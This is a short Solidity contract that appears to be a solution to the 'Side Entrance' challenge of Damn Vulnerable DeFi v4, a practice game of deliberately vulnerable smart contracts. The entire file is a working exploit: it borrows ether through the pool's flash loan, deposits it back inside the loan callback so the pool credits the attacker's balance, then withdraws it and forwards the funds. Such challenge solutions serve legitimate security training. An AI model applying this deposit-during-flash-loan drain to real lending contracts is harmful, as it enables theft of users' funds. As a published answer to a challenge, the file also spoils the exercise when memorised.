// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract AttackContract {
    SideEntranceLenderPool pool;
    address recovery;
    uint256 amount;

    constructor(
        SideEntranceLenderPool _pool,
        address _recovery,
        uint256 _amount
    ) {
        pool = _pool;
        amount = _amount;
        recovery = _recovery;
    }

    function trigger() public payable {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(amount);
    }

    function execute() public payable {
        // called by IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}